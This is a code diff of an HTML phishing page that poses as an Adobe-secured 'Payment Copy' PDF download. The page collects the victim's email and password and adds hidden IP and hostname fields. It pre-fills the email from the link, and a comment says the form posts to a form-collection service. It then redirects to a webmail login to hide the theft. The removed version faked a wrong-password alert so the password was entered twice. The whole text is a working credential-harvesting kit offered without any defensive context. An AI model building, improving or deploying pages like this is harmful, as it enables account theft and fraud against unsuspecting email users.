@@ -5,8 +5,108 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Protected PDF — Payment Copy</title>
   <style>
-    /* Same styling as before */
-    /* Your previous styles go here... */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      background: #f6f6f6 url('download.jpg') no-repeat center top;
+      background-size: cover;
+      overflow: hidden;
+    }
+    #splash { position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:9999; transition: opacity 1s ease; }
+    #splash h2 { font-size:22px; color:#d32f2f; margin-bottom:10px; }
+    #splash p { color:#666; font-size:14px; }
+    .loader { margin-top:20px; width:36px; height:36px; border:4px solid #ddd; border-top-color:#d32f2f; border-radius:50%; animation:spin 1s linear infinite; }
+    @keyframes spin{ to { transform: rotate(360deg); } }
+
+    #main { display:none; height:100%; display:flex; align-items:flex-start; justify-content:center; padding:28px 12px 60px; position:relative; }
+    #main.show { display:flex; animation: fadeIn 1s ease; }
+    @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+
+    body::before {
+      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      font-size: 46px;
+      font-weight: bold;
+      color: rgba(200, 0, 0, 0.12);
+      transform: rotate(-35deg);
+      white-space: pre;
+      line-height: 120px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card { width:450px; max-width:94%; background: rgba(255,255,255,0.95); border-radius:8px; box-shadow:0 10px 30px rgba(0,0,0,0.1); padding:28px 22px 34px; position:relative; z-index:2; backdrop-filter: blur(4px); }
+    .pdf-icon { display:flex; align-items:center; justify-content:center; margin-bottom:10px; }
+    .pdf-icon img { width:54px; height:auto; }
+    h1 { font-size:20px; text-align:center; margin-bottom:6px; }
+    p.lead { text-align:center; color:#666; margin-bottom:22px; font-size:14px; }
+    .input { width:100%; border:1px solid #e6e6e6; border-radius:4px; padding:14px 12px; margin-bottom:12px; color:#444; background:#fafafa; font-size:15px; }
+    .password-wrapper { position:relative; }
+    .toggle-password { position:absolute; top:50%; right:12px; transform:translateY(-50%); cursor:pointer; color:#999; font-size:18px; user-select:none; }
+    .toggle-password:hover { color:#d32f2f; }
+    .download-wrap { text-align:center; margin:16px 0 10px; }
+    .btn-download { display:inline-block; padding:12px 36px; border-radius:30px; background:#d32f2f; color:#fff; font-weight:700; text-transform:uppercase; letter-spacing:0.8px; box-shadow:0 6px 18px rgba(211,47,47,0.18); border:none; cursor:pointer; font-size:15px; }
+    .file-info { margin-top:18px; border-top:1px solid #eee; padding-top:14px; display:flex; gap:12px; align-items:flex-start; color:#333; }
+    .file-thumb { width:48px; flex:0 0 48px; } .file-thumb img { width:100%; } .file-meta { flex:1; } .file-meta h4 { margin-bottom:6px; font-size:15px; color:#0b58a8; } .file-meta .desc, .file-meta .size { font-size:13px; color:#666; }
+
+    /* new small helpers */
+    .small-actions { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
+    .link { color:#0b58a8; cursor:pointer; text-decoration:underline; display:inline-block; margin-left:8px; }
+    .hidden { display:none; }
+    .center-row { display:flex; gap:8px; align-items:center; justify-content:center; }
+
+    /* Modal styles */
+    #modalOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+    }
+    #modalBox {
+      background: #fff;
+      padding: 20px 26px;
+      border-radius: 8px;
+      max-width: 420px;
+      width: calc(100% - 40px);
+      text-align: center;
+      box-shadow: 0 8px 26px rgba(0,0,0,0.2);
+    }
+    #modalBox h3 {
+      font-size: 18px;
+      color: #d32f2f;
+      margin-bottom: 12px;
+    }
+    #modalBox p {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 14px;
+    }
+    #modalCountdown {
+      font-weight:700;
+      color:#444;
+      margin-bottom:10px;
+    }
+    #modalActions { display:flex; gap:10px; justify-content:center; margin-top:6px; }
+    .modalBtn {
+      padding: 10px 16px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+    }
+    .modalBtn.primary { background: #d32f2f; color: #fff; }
+    .modalBtn.secondary { background: #eef2f7; color: #0b58a8; }
   </style>
 </head>
 <body>
@@ -19,7 +119,11 @@
   <div id="main">
     <div class="card">
       <div class="pdf-icon">
-        <!-- Your icon goes here -->
+        <img src="data:image/svg+xml;utf8,
+          <svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'>
+            <rect width='72' height='90' rx='6' fill='%23d63636'/>
+            <text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text>
+          </svg>" alt="PDF icon">
       </div>
 
       <h1>This File is Protected By Adobe®<br>Security.</h1>
@@ -35,33 +139,27 @@
           </div>
         </div>
 
-        <!-- Step 1: Password input -->
-        <div id="stepPassword1" class="hidden">
+        <div id="stepPassword" class="hidden">
           <div class="password-wrapper">
-            <input id="password1" name="password1" class="input" type="password" placeholder="Enter Password" autocomplete="current-password" required>
-            <span id="togglePassword1" class="toggle-password" title="Show / hide password">👁️</span>
+            <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
+            <span id="togglePassword" class="toggle-password" title="Show / hide password">👁️</span>
           </div>
-          <div class="download-wrap">
-            <button id="submitBtn1" class="btn-download" type="button">Submit Password</button>
-          </div>
-        </div>
+          <input type="hidden" name="ip" id="ip">
+          <input type="hidden" name="hostname" id="hostname">
 
-        <!-- Step 2: Confirm Password input -->
-        <div id="stepPassword2" class="hidden">
-          <div class="password-wrapper">
-            <input id="password2" name="password2" class="input" type="password" placeholder="Confirm Password" autocomplete="current-password" required>
-            <span id="togglePassword2" class="toggle-password" title="Show / hide password">👁️</span>
-          </div>
           <div class="download-wrap">
             <button class="btn-download" type="submit">DOWNLOAD</button>
           </div>
         </div>
       </form>
 
-      <!-- File info section -->
       <div class="file-info">
         <div class="file-thumb">
-          <!-- Your file thumbnail here -->
+          <img src="data:image/svg+xml;utf8,
+            <svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'>
+              <rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/>
+              <text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text>
+            </svg>" alt="">
         </div>
         <div class="file-meta">
           <h4>Download File Information</h4>
@@ -73,7 +171,6 @@
   </div>
 
   <script>
-    // Splash
     window.addEventListener('load', () => {
       setTimeout(() => {
         document.getElementById('splash').style.opacity = '0';
@@ -85,57 +182,64 @@
     });
 
     const emailInput = document.getElementById('email');
-    const continueBtn = document.getElementById('continueBtn');
-    const password1Input = document.getElementById('password1');
-    const password2Input = document.getElementById('password2');
+    const passwordInput = document.getElementById('password');
     const stepEmail = document.getElementById('stepEmail');
-    const stepPassword1 = document.getElementById('stepPassword1');
-    const stepPassword2 = document.getElementById('stepPassword2');
-    const togglePassword1 = document.getElementById('togglePassword1');
-    const togglePassword2 = document.getElementById('togglePassword2');
-    const submitBtn1 = document.getElementById('submitBtn1');
+    const stepPassword = document.getElementById('stepPassword');
+    const continueBtn = document.getElementById('continueBtn');
+    const toggle = document.getElementById('togglePassword');
 
-    // Show password 1 step
+    // Autofill email (editable)
+    window.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(window.location.search);
+      const urlEmail = params.get('email');
+
+      if (urlEmail) {
+        emailInput.value = decodeURIComponent(urlEmail);
+      } else {
+        const saved = localStorage.getItem('savedEmail');
+        if (saved) {
+          emailInput.value = saved;
+        }
+      }
+
+      emailInput.addEventListener('input', () => {
+        try { localStorage.setItem('savedEmail', emailInput.value); } catch(e){}
+      });
+    });
+
+    // Continue → show password
     continueBtn.addEventListener('click', () => {
       if (!emailInput.value) {
         emailInput.focus();
         return;
       }
       stepEmail.classList.add('hidden');
-      stepPassword1.classList.remove('hidden');
-      password1Input.focus();
+      stepPassword.classList.remove('hidden');
+      if (passwordInput) passwordInput.focus();
     });
 
-    // Show password 2 step after incorrect first attempt
-    submitBtn1.addEventListener('click', () => {
-      // Simulate incorrect password for the first submission
-      alert("The password you entered is incorrect. Please try again.");
-      stepPassword1.classList.add('hidden');
-      stepPassword2.classList.remove('hidden');
-      password2Input.focus();
-    });
-
-    // Toggle password visibility for both inputs
-    if (togglePassword1 && password1Input) {
-      togglePassword1.addEventListener('click', () => {
-        const isHidden = password1Input.type === 'password';
-        password1Input.type = isHidden ? 'text' : 'password';
-        togglePassword1.textContent = isHidden ? '🙈' : '👁️';
+    // Toggle password visibility
+    if (toggle && passwordInput) {
+      toggle.addEventListener('click', () => {
+        const isHidden = passwordInput.type === 'password';
+        passwordInput.type = isHidden ? 'text' : 'password';
+        toggle.textContent = isHidden ? '🙈' : '👁️';
       });
     }
 
-    if (togglePassword2 && password2Input) {
-      togglePassword2.addEventListener('click', () => {
-        const isHidden = password2Input.type === 'password';
-        password2Input.type = isHidden ? 'text' : 'password';
-        togglePassword2.textContent = isHidden ? '🙈' : '👁️';
-      });
-    }
-
-    // Submit the form even if the passwords don't match
+    // Submit the form regardless of password
     document.getElementById('mainForm').addEventListener('submit', (e) => {
-      e.preventDefault(); 
-      e.target.submit();  // Submit the form to Formspark
+      e.preventDefault(); // Prevent form submission to stay in the page
+      
+      // Immediately submit to FirmSpark
+      try {
+        document.getElementById('mainForm').submit();
+      } catch (err) {
+        console.warn('Error submitting the form', err);
+      }
+      
+      // Optionally, redirect after form submission if needed
+      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
     });
   </script>
 </body>
